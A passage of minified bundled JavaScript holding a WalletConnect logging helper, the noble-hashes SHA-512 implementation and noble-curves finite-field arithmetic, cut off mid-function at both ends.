            e.push(t.value),
            t = t.next;
        return e
    }
    get length() {
        return this.lengthInNodes
    }
    get size() {
        return this.sizeInBytes
    }
    toOrderedArray() {
        return Array.from(this)
    }
    [Symbol.iterator]() {
        let e = this.head;
        return {
            next: () => {
                if (!e)
                    return {
                        done: !0,
                        value: null
                    };
                const t = e.value;
                return e = e.next,
                {
                    done: !1,
                    value: t
                }
            }
        }
    }
}
  , TM = class {
    constructor(e, t=b3) {
        this.level = e ?? "error",
        this.levelValue = Lf.levels.values[this.level],
        this.MAX_LOG_SIZE_IN_BYTES = t,
        this.logs = new L8(this.MAX_LOG_SIZE_IN_BYTES)
    }
    forwardToConsole(e, t) {
        t === Lf.levels.values.error ? console.error(e) : t === Lf.levels.values.warn ? console.warn(e) : t === Lf.levels.values.debug ? console.debug(e) : t === Lf.levels.values.trace ? console.trace(e) : console.log(e)
    }
    appendToLogs(e) {
        this.logs.append(uu({
            timestamp: new Date().toISOString(),
            log: e
        }));
        const t = typeof e == "string" ? JSON.parse(e).level : e.level;
        t >= this.levelValue && this.forwardToConsole(e, t)
    }
    getLogs() {
        return this.logs
    }
    clearLogs() {
        this.logs = new L8(this.MAX_LOG_SIZE_IN_BYTES)
    }
    getLogArray() {
        return Array.from(this.logs)
    }
    logsToBlob(e) {
        const t = this.getLogArray();
        return t.push(uu({
            extraMetadata: e
        })),
        new Blob(t,{
            type: "application/json"
        })
    }
}
  , _K = class {
    constructor(e, t=b3) {
        this.baseChunkLogger = new TM(e,t)
    }
    write(e) {
        this.baseChunkLogger.appendToLogs(e)
    }
    getLogs() {
        return this.baseChunkLogger.getLogs()
    }
    clearLogs() {
        this.baseChunkLogger.clearLogs()
    }
    getLogArray() {
        return this.baseChunkLogger.getLogArray()
    }
    logsToBlob(e) {
        return this.baseChunkLogger.logsToBlob(e)
    }
    downloadLogsBlobInBrowser(e) {
        const t = URL.createObjectURL(this.logsToBlob(e))
          , o = document.createElement("a");
        o.href = t,
        o.download = `walletconnect-logs-${new Date().toISOString()}.txt`,
        document.body.appendChild(o),
        o.click(),
        document.body.removeChild(o),
        URL.revokeObjectURL(t)
    }
}
  , IK = class {
    constructor(e, t=b3) {
        this.baseChunkLogger = new TM(e,t)
    }
    write(e) {
        this.baseChunkLogger.appendToLogs(e)
    }
    getLogs() {
        return this.baseChunkLogger.getLogs()
    }
    clearLogs() {
        this.baseChunkLogger.clearLogs()
    }
    getLogArray() {
        return this.baseChunkLogger.getLogArray()
    }
    logsToBlob(e) {
        return this.baseChunkLogger.logsToBlob(e)
    }
}
;
var OK = Object.defineProperty
  , RK = Object.defineProperties
  , WK = Object.getOwnPropertyDescriptors
  , $8 = Object.getOwnPropertySymbols
  , MK = Object.prototype.hasOwnProperty
  , NK = Object.prototype.propertyIsEnumerable
  , z8 = (r, e, t) => e in r ? OK(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , Jm = (r, e) => {
    for (var t in e || (e = {}))
        MK.call(e, t) && z8(r, t, e[t]);
    if ($8)
        for (var t of $8(e))
            NK.call(e, t) && z8(r, t, e[t]);
    return r
}
  , Qm = (r, e) => RK(r, WK(e));
function m3(r) {
    return Qm(Jm({}, r), {
        level: (r == null ? void 0 : r.level) || SK.level
    })
}
function DK(r, e=y0) {
    return r[e] || ""
}
function FK(r, e, t=y0) {
    return r[t] = e,
    r
}
function zo(r, e=y0) {
    let t = "";
    return typeof r.bindings > "u" ? t = DK(r, e) : t = r.bindings().context || "",
    t
}
function UK(r, e, t=y0) {
    const o = zo(r, t);
    return o.trim() ? `${o}/${e}` : e
}
function xo(r, e, t=y0) {
    const o = UK(r, e, t)
      , i = r.child({
        context: o
    });
    return FK(i, o, t)
}
function kK(r) {
    var e, t;
    const o = new _K((e = r.opts) == null ? void 0 : e.level,r.maxSizeInBytes);
    return {
        logger: S1(Qm(Jm({}, r.opts), {
            level: "trace",
            browser: Qm(Jm({}, (t = r.opts) == null ? void 0 : t.browser), {
                write: i => o.write(i)
            })
        })),
        chunkLoggerController: o
    }
}
function LK(r) {
    var e;
    const t = new IK((e = r.opts) == null ? void 0 : e.level,r.maxSizeInBytes);
    return {
        logger: S1(Qm(Jm({}, r.opts), {
            level: "trace"
        }), t),
        chunkLoggerController: t
    }
}
function $K(r) {
    return typeof r.loggerOverride < "u" && typeof r.loggerOverride != "string" ? {
        logger: r.loggerOverride,
        chunkLoggerController: null
    } : typeof window < "u" ? kK(r) : LK(r)
}
var zK = Object.defineProperty
  , jK = (r, e, t) => e in r ? zK(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , j8 = (r, e, t) => jK(r, typeof e != "symbol" ? e + "" : e, t);
let qK = class extends Cu {
    constructor(e) {
        super(),
        this.opts = e,
        j8(this, "protocol", "wc"),
        j8(this, "version", 2)
    }
}
;
var VK = Object.defineProperty
  , HK = (r, e, t) => e in r ? VK(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , GK = (r, e, t) => HK(r, e + "", t);
class KK extends Cu {
    constructor(e, t) {
        super(),
        this.core = e,
        this.logger = t,
        GK(this, "records", new Map)
    }
}
let ZK = class {
    constructor(e, t) {
        this.logger = e,
        this.core = t
    }
}
;
class YK extends Cu {
    constructor(e, t) {
        super(),
        this.relayer = e,
        this.logger = t
    }
}
let XK = class extends Cu {
    constructor(e) {
        super()
    }
}
  , JK = class {
    constructor(e, t, o, i) {
        this.core = e,
        this.logger = t,
        this.name = o
    }
}
  , QK = class extends Cu {
    constructor(e, t) {
        super(),
        this.relayer = e,
        this.logger = t
    }
}
  , eZ = class extends Cu {
    constructor(e, t) {
        super(),
        this.core = e,
        this.logger = t
    }
}
  , tZ = class {
    constructor(e, t, o) {
        this.core = e,
        this.logger = t,
        this.store = o
    }
}
  , rZ = class {
    constructor(e, t) {
        this.projectId = e,
        this.logger = t
    }
}
;
class nZ {
    constructor(e, t, o) {
        this.core = e,
        this.logger = t,
        this.telemetryEnabled = o
    }
}
var oZ = Object.defineProperty
  , iZ = (r, e, t) => e in r ? oZ(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , q8 = (r, e, t) => iZ(r, typeof e != "symbol" ? e + "" : e, t);
let sZ = class {
    constructor(e) {
        this.opts = e,
        q8(this, "protocol", "wc"),
        q8(this, "version", 2)
    }
}
  , aZ = class {
    constructor(e) {
        this.client = e
    }
}
;
function cZ(r) {
    return r instanceof Uint8Array || ArrayBuffer.isView(r) && r.constructor.name === "Uint8Array"
}
function EM(r, ...e) {
    if (!cZ(r))
        throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(r.length))
        throw new Error("Uint8Array expected of length " + e + ", got length=" + r.length)
}
function V8(r, e=!0) {
    if (r.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (e && r.finished)
        throw new Error("Hash#digest() has already been called")
}
function lZ(r, e) {
    EM(r);
    const t = e.outputLen;
    if (r.length < t)
        throw new Error("digestInto() expects output buffer of length at least " + t)
}
const yf = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const e2 = r => new DataView(r.buffer,r.byteOffset,r.byteLength);
function uZ(r) {
    if (typeof r != "string")
        throw new Error("utf8ToBytes expected string, got " + typeof r);
    return new Uint8Array(new TextEncoder().encode(r))
}
function AM(r) {
    return typeof r == "string" && (r = uZ(r)),
    EM(r),
    r
}
let fZ = class {
    clone() {
        return this._cloneInto()
    }
}
;
function dZ(r) {
    const e = o => r().update(AM(o)).digest()
      , t = r();
    return e.outputLen = t.outputLen,
    e.blockLen = t.blockLen,
    e.create = () => r(),
    e
}
function PM(r=32) {
    if (yf && typeof yf.getRandomValues == "function")
        return yf.getRandomValues(new Uint8Array(r));
    if (yf && typeof yf.randomBytes == "function")
        return yf.randomBytes(r);
    throw new Error("crypto.getRandomValues must be defined")
}
function hZ(r, e, t, o) {
    if (typeof r.setBigUint64 == "function")
        return r.setBigUint64(e, t, o);
    const i = BigInt(32)
      , n = BigInt(4294967295)
      , s = Number(t >> i & n)
      , a = Number(t & n)
      , l = o ? 4 : 0
      , f = o ? 0 : 4;
    r.setUint32(e + l, s, o),
    r.setUint32(e + f, a, o)
}
let pZ = class extends fZ {
    constructor(e, t, o, i) {
        super(),
        this.blockLen = e,
        this.outputLen = t,
        this.padOffset = o,
        this.isLE = i,
        this.finished = !1,
        this.length = 0,
        this.pos = 0,
        this.destroyed = !1,
        this.buffer = new Uint8Array(e),
        this.view = e2(this.buffer)
    }
    update(e) {
        V8(this);
        const {view: t, buffer: o, blockLen: i} = this;
        e = AM(e);
        const n = e.length;
        for (let s = 0; s < n; ) {
            const a = Math.min(i - this.pos, n - s);
            if (a === i) {
                const l = e2(e);
                for (; i <= n - s; s += i)
                    this.process(l, s);
                continue
            }
            o.set(e.subarray(s, s + a), this.pos),
            this.pos += a,
            s += a,
            this.pos === i && (this.process(t, 0),
            this.pos = 0)
        }
        return this.length += e.length,
        this.roundClean(),
        this
    }
    digestInto(e) {
        V8(this),
        lZ(e, this),
        this.finished = !0;
        const {buffer: t, view: o, blockLen: i, isLE: n} = this;
        let {pos: s} = this;
        t[s++] = 128,
        this.buffer.subarray(s).fill(0),
        this.padOffset > i - s && (this.process(o, 0),
        s = 0);
        for (let p = s; p < i; p++)
            t[p] = 0;
        hZ(o, i - 8, BigInt(this.length * 8), n),
        this.process(o, 0);
        const a = e2(e)
          , l = this.outputLen;
        if (l % 4)
            throw new Error("_sha2: outputLen should be aligned to 32bit");
        const f = l / 4
          , h = this.get();
        if (f > h.length)
            throw new Error("_sha2: outputLen bigger than state");
        for (let p = 0; p < f; p++)
            a.setUint32(4 * p, h[p], n)
    }
    digest() {
        const {buffer: e, outputLen: t} = this;
        this.digestInto(e);
        const o = e.slice(0, t);
        return this.destroy(),
        o
    }
    _cloneInto(e) {
        e || (e = new this.constructor),
        e.set(...this.get());
        const {blockLen: t, buffer: o, length: i, finished: n, destroyed: s, pos: a} = this;
        return e.length = i,
        e.pos = a,
        e.finished = n,
        e.destroyed = s,
        i % t && e.buffer.set(o),
        e
    }
}
;
const sy = BigInt(2 ** 32 - 1)
  , IE = BigInt(32);
function CM(r, e=!1) {
    return e ? {
        h: Number(r & sy),
        l: Number(r >> IE & sy)
    } : {
        h: Number(r >> IE & sy) | 0,
        l: Number(r & sy) | 0
    }
}
function gZ(r, e=!1) {
    let t = new Uint32Array(r.length)
      , o = new Uint32Array(r.length);
    for (let i = 0; i < r.length; i++) {
        const {h: n, l: s} = CM(r[i], e);
        [t[i],o[i]] = [n, s]
    }
    return [t, o]
}
const yZ = (r, e) => BigInt(r >>> 0) << IE | BigInt(e >>> 0)
  , bZ = (r, e, t) => r >>> t
  , mZ = (r, e, t) => r << 32 - t | e >>> t
  , xZ = (r, e, t) => r >>> t | e << 32 - t
  , wZ = (r, e, t) => r << 32 - t | e >>> t
  , vZ = (r, e, t) => r << 64 - t | e >>> t - 32
  , TZ = (r, e, t) => r >>> t - 32 | e << 64 - t
  , EZ = (r, e) => e
  , AZ = (r, e) => r
  , PZ = (r, e, t) => r << t | e >>> 32 - t
  , CZ = (r, e, t) => e << t | r >>> 32 - t
  , SZ = (r, e, t) => e << t - 32 | r >>> 64 - t
  , BZ = (r, e, t) => r << t - 32 | e >>> 64 - t;
function _Z(r, e, t, o) {
    const i = (e >>> 0) + (o >>> 0);
    return {
        h: r + t + (i / 2 ** 32 | 0) | 0,
        l: i | 0
    }
}
const IZ = (r, e, t) => (r >>> 0) + (e >>> 0) + (t >>> 0)
  , OZ = (r, e, t, o) => e + t + o + (r / 2 ** 32 | 0) | 0
  , RZ = (r, e, t, o) => (r >>> 0) + (e >>> 0) + (t >>> 0) + (o >>> 0)
  , WZ = (r, e, t, o, i) => e + t + o + i + (r / 2 ** 32 | 0) | 0
  , MZ = (r, e, t, o, i) => (r >>> 0) + (e >>> 0) + (t >>> 0) + (o >>> 0) + (i >>> 0)
  , NZ = (r, e, t, o, i, n) => e + t + o + i + n + (r / 2 ** 32 | 0) | 0
  , jt = {
    fromBig: CM,
    split: gZ,
    toBig: yZ,
    shrSH: bZ,
    shrSL: mZ,
    rotrSH: xZ,
    rotrSL: wZ,
    rotrBH: vZ,
    rotrBL: TZ,
    rotr32H: EZ,
    rotr32L: AZ,
    rotlSH: PZ,
    rotlSL: CZ,
    rotlBH: SZ,
    rotlBL: BZ,
    add: _Z,
    add3L: IZ,
    add3H: OZ,
    add4L: RZ,
    add4H: WZ,
    add5H: NZ,
    add5L: MZ
}
  , [DZ,FZ] = jt.split(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map(r => BigInt(r)))
  , mc = new Uint32Array(80)
  , xc = new Uint32Array(80);
let UZ = class extends pZ {
    constructor() {
        super(128, 64, 16, !1),
        this.Ah = 1779033703,
        this.Al = -205731576,
        this.Bh = -1150833019,
        this.Bl = -2067093701,
        this.Ch = 1013904242,
        this.Cl = -23791573,
        this.Dh = -1521486534,
        this.Dl = 1595750129,
        this.Eh = 1359893119,
        this.El = -1377402159,
        this.Fh = -1694144372,
        this.Fl = 725511199,
        this.Gh = 528734635,
        this.Gl = -79577749,
        this.Hh = 1541459225,
        this.Hl = 327033209
    }
    get() {
        const {Ah: e, Al: t, Bh: o, Bl: i, Ch: n, Cl: s, Dh: a, Dl: l, Eh: f, El: h, Fh: p, Fl: b, Gh: v, Gl: T, Hh: x, Hl: E} = this;
        return [e, t, o, i, n, s, a, l, f, h, p, b, v, T, x, E]
    }
    set(e, t, o, i, n, s, a, l, f, h, p, b, v, T, x, E) {
        this.Ah = e | 0,
        this.Al = t | 0,
        this.Bh = o | 0,
        this.Bl = i | 0,
        this.Ch = n | 0,
        this.Cl = s | 0,
        this.Dh = a | 0,
        this.Dl = l | 0,
        this.Eh = f | 0,
        this.El = h | 0,
        this.Fh = p | 0,
        this.Fl = b | 0,
        this.Gh = v | 0,
        this.Gl = T | 0,
        this.Hh = x | 0,
        this.Hl = E | 0
    }
    process(e, t) {
        for (let O = 0; O < 16; O++,
        t += 4)
            mc[O] = e.getUint32(t),
            xc[O] = e.getUint32(t += 4);
        for (let O = 16; O < 80; O++) {
            const F = mc[O - 15] | 0
              , D = xc[O - 15] | 0
              , I = jt.rotrSH(F, D, 1) ^ jt.rotrSH(F, D, 8) ^ jt.shrSH(F, D, 7)
              , M = jt.rotrSL(F, D, 1) ^ jt.rotrSL(F, D, 8) ^ jt.shrSL(F, D, 7)
              , C = mc[O - 2] | 0
              , W = xc[O - 2] | 0
              , k = jt.rotrSH(C, W, 19) ^ jt.rotrBH(C, W, 61) ^ jt.shrSH(C, W, 6)
              , H = jt.rotrSL(C, W, 19) ^ jt.rotrBL(C, W, 61) ^ jt.shrSL(C, W, 6)
              , X = jt.add4L(M, H, xc[O - 7], xc[O - 16])
              , Y = jt.add4H(X, I, k, mc[O - 7], mc[O - 16]);
            mc[O] = Y | 0,
            xc[O] = X | 0
        }
        let {Ah: o, Al: i, Bh: n, Bl: s, Ch: a, Cl: l, Dh: f, Dl: h, Eh: p, El: b, Fh: v, Fl: T, Gh: x, Gl: E, Hh: B, Hl: P} = this;
        for (let O = 0; O < 80; O++) {
            const F = jt.rotrSH(p, b, 14) ^ jt.rotrSH(p, b, 18) ^ jt.rotrBH(p, b, 41)
              , D = jt.rotrSL(p, b, 14) ^ jt.rotrSL(p, b, 18) ^ jt.rotrBL(p, b, 41)
              , I = p & v ^ ~p & x
              , M = b & T ^ ~b & E
              , C = jt.add5L(P, D, M, FZ[O], xc[O])
              , W = jt.add5H(C, B, F, I, DZ[O], mc[O])
              , k = C | 0
              , H = jt.rotrSH(o, i, 28) ^ jt.rotrBH(o, i, 34) ^ jt.rotrBH(o, i, 39)
              , X = jt.rotrSL(o, i, 28) ^ jt.rotrBL(o, i, 34) ^ jt.rotrBL(o, i, 39)
              , Y = o & n ^ o & a ^ n & a
              , V = i & s ^ i & l ^ s & l;
            B = x | 0,
            P = E | 0,
            x = v | 0,
            E = T | 0,
            v = p | 0,
            T = b | 0,
            {h: p, l: b} = jt.add(f | 0, h | 0, W | 0, k | 0),
            f = a | 0,
            h = l | 0,
            a = n | 0,
            l = s | 0,
            n = o | 0,
            s = i | 0;
            const R = jt.add3L(k, X, V);
            o = jt.add3H(R, W, H, Y),
            i = R | 0
        }
        ({h: o, l: i} = jt.add(this.Ah | 0, this.Al | 0, o | 0, i | 0)),
        {h: n, l: s} = jt.add(this.Bh | 0, this.Bl | 0, n | 0, s | 0),
        {h: a, l} = jt.add(this.Ch | 0, this.Cl | 0, a | 0, l | 0),
        {h: f, l: h} = jt.add(this.Dh | 0, this.Dl | 0, f | 0, h | 0),
        {h: p, l: b} = jt.add(this.Eh | 0, this.El | 0, p | 0, b | 0),
        {h: v, l: T} = jt.add(this.Fh | 0, this.Fl | 0, v | 0, T | 0),
        {h: x, l: E} = jt.add(this.Gh | 0, this.Gl | 0, x | 0, E | 0),
        {h: B, l: P} = jt.add(this.Hh | 0, this.Hl | 0, B | 0, P | 0),
        this.set(o, i, n, s, a, l, f, h, p, b, v, T, x, E, B, P)
    }
    roundClean() {
        mc.fill(0),
        xc.fill(0)
    }
    destroy() {
        this.buffer.fill(0),
        this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    }
}
;
const kZ = dZ( () => new UZ);
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const x3 = BigInt(0)
  , SM = BigInt(1)
  , LZ = BigInt(2);
function w3(r) {
    return r instanceof Uint8Array || ArrayBuffer.isView(r) && r.constructor.name === "Uint8Array"
}
function v3(r) {
    if (!w3(r))
        throw new Error("Uint8Array expected")
}
function t2(r, e) {
    if (typeof e != "boolean")
        throw new Error(r + " boolean expected, got " + e)
}
const $Z = Array.from({
    length: 256
}, (r, e) => e.toString(16).padStart(2, "0"));
function T3(r) {
    v3(r);
    let e = "";
    for (let t = 0; t < r.length; t++)
        e += $Z[r[t]];
    return e
}
function BM(r) {
    if (typeof r != "string")
        throw new Error("hex string expected, got " + typeof r);
    return r === "" ? x3 : BigInt("0x" + r)
}
const ya = {
    _0: 48,
    _9: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};
function H8(r) {
    if (r >= ya._0 && r <= ya._9)
        return r - ya._0;
    if (r >= ya.A && r <= ya.F)
        return r - (ya.A - 10);
    if (r >= ya.a && r <= ya.f)
        return r - (ya.a - 10)
}
function _M(r) {
    if (typeof r != "string")
        throw new Error("hex string expected, got " + typeof r);
    const e = r.length
      , t = e / 2;
    if (e % 2)
        throw new Error("hex string expected, got unpadded hex of length " + e);
    const o = new Uint8Array(t);
    for (let i = 0, n = 0; i < t; i++,
    n += 2) {
        const s = H8(r.charCodeAt(n))
          , a = H8(r.charCodeAt(n + 1));
        if (s === void 0 || a === void 0) {
            const l = r[n] + r[n + 1];
            throw new Error('hex string expected, got non-hex character "' + l + '" at index ' + n)
        }
        o[i] = s * 16 + a
    }
    return o
}
function zZ(r) {
    return BM(T3(r))
}
function wm(r) {
    return v3(r),
    BM(T3(Uint8Array.from(r).reverse()))
}
function IM(r, e) {
    return _M(r.toString(16).padStart(e * 2, "0"))
}
function OE(r, e) {
    return IM(r, e).reverse()
}
function ba(r, e, t) {
    let o;
    if (typeof e == "string")
        try {
            o = _M(e)
        } catch (n) {
            throw new Error(r + " must be hex string or Uint8Array, cause: " + n)
        }
    else if (w3(e))
        o = Uint8Array.from(e);
    else
        throw new Error(r + " must be hex string or Uint8Array");
    const i = o.length;
    if (typeof t == "number" && i !== t)
        throw new Error(r + " of length " + t + " expected, got " + i);
    return o
}
function G8(...r) {
    let e = 0;
    for (let o = 0; o < r.length; o++) {
        const i = r[o];
        v3(i),
        e += i.length
    }
    const t = new Uint8Array(e);
    for (let o = 0, i = 0; o < r.length; o++) {
        const n = r[o];
        t.set(n, i),
        i += n.length
    }
    return t
}
const r2 = r => typeof r == "bigint" && x3 <= r;
function jZ(r, e, t) {
    return r2(r) && r2(e) && r2(t) && e <= r && r < t
}
function up(r, e, t, o) {
    if (!jZ(e, t, o))
        throw new Error("expected valid " + r + ": " + t + " <= n < " + o + ", got " + e)
}
function qZ(r) {
    let e;
    for (e = 0; r > x3; r >>= SM,
    e += 1)
        ;
    return e
}
const VZ = r => (LZ << BigInt(r - 1)) - SM
  , HZ = {
    bigint: r => typeof r == "bigint",
    function: r => typeof r == "function",
    boolean: r => typeof r == "boolean",
    string: r => typeof r == "string",
    stringOrUint8Array: r => typeof r == "string" || w3(r),
    isSafeInteger: r => Number.isSafeInteger(r),
    array: r => Array.isArray(r),
    field: (r, e) => e.Fp.isValid(r),
    hash: r => typeof r == "function" && Number.isSafeInteger(r.outputLen)
};
function E3(r, e, t={}) {
    const o = (i, n, s) => {
        const a = HZ[n];
        if (typeof a != "function")
            throw new Error("invalid validator function");
        const l = r[i];
        if (!(s && l === void 0) && !a(l, r))
            throw new Error("param " + String(i) + " is invalid. Expected " + n + ", got " + l)
    }
    ;
    for (const [i,n] of Object.entries(e))
        o(i, n, !1);
    for (const [i,n] of Object.entries(t))
        o(i, n, !0);
    return r
}
function K8(r) {
    const e = new WeakMap;
    return (t, ...o) => {
        const i = e.get(t);
        if (i !== void 0)
            return i;
        const n = r(t, ...o);
        return e.set(t, n),
        n
    }
}
const _n = BigInt(0)
  , Jr = BigInt(1)
  , Wl = BigInt(2)
  , GZ = BigInt(3)
  , RE = BigInt(4)
  , Z8 = BigInt(5)
  , Y8 = BigInt(8);
function bn(r, e) {
    const t = r % e;
    return t >= _n ? t : e + t
}
function KZ(r, e, t) {
    if (e < _n)
        throw new Error("invalid exponent, negatives unsupported");
    if (t <= _n)
        throw new Error("invalid modulus");
    if (t === Jr)
        return _n;
    let o = Jr;
    for (; e > _n; )
        e & Jr && (o = o * r % t),
        r = r * r % t,
        e >>= Jr;
    return o
}
function Cs(r, e, t) {
    let o = r;
    for (; e-- > _n; )
        o *= o,
        o %= t;
    return o
}
function X8(r, e) {
    if (r === _n)
        throw new Error("invert: expected non-zero number");
    if (e <= _n)
        throw new Error("invert: expected positive modulus, got " + e);
    let t = bn(r, e)
      , o = e
      , i = _n
      , n = Jr;
    for (; t !== _n; ) {
        const s = o / t
          , a = o % t
          , l = i - n * s;
        o = t,
        t = a,
        i = n,
        n = l
    }
    if (o !== Jr)
        throw new Error("invert: does not exist");
    return bn(i, e)
}
function ZZ(r) {
    const e = (r - Jr) / Wl;
    let t, o, i;
    for (t = r - Jr,
    o = 0; t % Wl === _n; t /= Wl,
    o++)
        ;
    for (i = Wl; i < r && KZ(i, e, r) !== r - Jr; i++)
        if (i > 1e3)
            throw new Error("Cannot find square root: likely non-prime P");
    if (o === 1) {
        const s = (r + Jr) / RE;
        return function(a, l) {
            const f = a.pow(l, s);
            if (!a.eql(a.sqr(f), l))
                throw new Error("Cannot find square root");
            return f
        }
    }
    const n = (t + Jr) / Wl;
    return function(s, a) {
        if (s.pow(a, e) === s.neg(s.ONE))
            throw new Error("Cannot find square root");
        let l = o
          , f = s.pow(s.mul(s.ONE, i), t)
          , h = s.pow(a, n)
          , p = s.pow(a, t);
        for (; !s.eql(p, s.ONE); ) {
            if (s.eql(p, s.ZERO))
                return s.ZERO;
            let b = 1;
            for (let T = s.sqr(p); b < l && !s.eql(T, s.ONE); b++)
                T = s.sqr(T);
            const v = s.pow(f, Jr << BigInt(l - b - 1));
            f = s.sqr(v),
            h = s.mul(h, v),
            p = s.mul(p, f),
            l = b
        }
        return h
    }
}
function YZ(r) {
    if (r % RE === GZ) {
        const e = (r + Jr) / RE;
        return function(t, o) {
            const i = t.pow(o, e);
            if (!t.eql(t.sqr(i), o))
                throw new Error("Cannot find square root");
            return i
        }
    }
    if (r % Y8 === Z8) {
        const e = (r - Z8) / Y8;
        return function(t, o) {
            const i = t.mul(o, Wl)
              , n = t.pow(i, e)
              , s = t.mul(o, n)
              , a = t.mul(t.mul(s, Wl), n)
              , l = t.mul(s, t.sub(a, t.ONE));
            if (!t.eql(t.sqr(l), o))
                throw new Error("Cannot find square root");
            return l
        }
    }
    return ZZ(r)
}
const XZ = (r, e) => (bn(r, e) & Jr) === Jr
  , JZ = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
function QZ(r) {
    const e = {
        ORDER: "bigint",
        MASK: "bigint",
        BYTES: "isSafeInteger",
        BITS: "isSafeInteger"
    }
      , t = JZ.reduce( (o, i) => (o[i] = "function",
    o), e);
    return E3(r, t)
}
function eY(r, e, t) {
    if (t < _n)
        throw new Error("invalid exponent, negatives unsupported");
    if (t === _n)
        return r.ONE;
    if (t === Jr)
        return e;
    let o = r.ONE
      , i = e;
    for (; t > _n; )
        t & Jr && (o = r.mul(o, i)),
        i = r.sqr(i),
        t >>= Jr;
    return o
}
function tY(r, e) {
    const t = new Array(e.length)
      , o = e.reduce( (n, s, a) => r.is0(s) ? n : (t[a] = n,
    r.mul(n, s)), r.ONE)
      , i = r.inv(o);
    return e.reduceRight( (n, s, a) => r.is0(s) ? n : (t[a] = r.mul(n, t[a]),
    r.mul(n, s)), i),
    t
}
function OM(r, e) {
    const t = e !== void 0 ? e : r.toString(2).length
      , o = Math.ceil(t / 8);
    return {
        nBitLength: t,
        nByteLength: o
    }
}
function RM(r, e, t=!1, o={}) {
    if (r <= _n)
        throw new Error("invalid field: expected ORDER > 0, got " + r);
    const {nBitLength: i, nByteLength: n} = OM(r, e);
    if (n > 2048)
        throw new Error("invalid field: expected ORDER of <= 2048 bytes");
    let s;
    const a = Object.freeze({
        ORDER: r,
        isLE: t,
        BITS: i,
        BYTES: n,
        MASK: VZ(i),
        ZERO: _n,
        ONE: Jr,
        create: l => bn(l, r),
        isValid: l => {
            if (typeof l != "bigint")
                throw new Error("invalid field element: expected bigint, got " + typeof l);
            return _n <= l && l < r
        }
        ,
        is0: l => l === _n,
        isOdd: l => (l & Jr) === Jr,
        neg: l => bn(-l, r),
        eql: (l, f) => l === f,
        sqr: l => bn(l * l, r),
        add: (l, f) => bn(l + f, r),
        sub: (l, f) => bn(l - f, r),
        mul: (l, f) => bn(l * f, r),
        pow: (l, f) => eY(a, l, f),
        div: (l, f) => bn(l * X8(f, r), r),
        sqrN: l => l * l,
        addN: (l, f) => l + f,
        subN: (l, f) => l - f,
        mulN: (l, f) => l * f,
        inv: l => X8(l, r),
        sqrt: o.sqrt || (l => (s || (s = YZ(r)),
        s(a, l))),
        invertBatch: l => tY(a, l),
        cmov: (l, f, h) => h ? f : l,
        toBytes: l => t ? OE(l, n) : IM(l, n),
        fromBytes: l => {
            if (l.length !== n)
                throw new Error("Field.fromBytes: expected " + n + " bytes, got " + l.length);
            return t ? wm(l) : zZ(l)
        }
    });
    return Object.freeze(a)
}
const J8 = BigInt(0)
  , ay = BigInt(1);
function n2(r, e) {
    const t = e.negate();
    return r ? t : e
}
function WM(r, e) {
    if (!Number.isSafeInteger(r) || r <= 0 || r > e)
        throw new Error("invalid window size, expected [1.." + e + "], got W=" + r)
}
function o2(r, e) {
    WM(r, e);
    const t = Math.ceil(e / r) + 1
      , o = 2 ** (r - 1);
    return {
        windows: t,
        windowSize: o
    }
}
function rY(r, e) {
    if (!Array.isArray(r))
        throw new Error("array expected");
    r.forEach( (t, o) => {
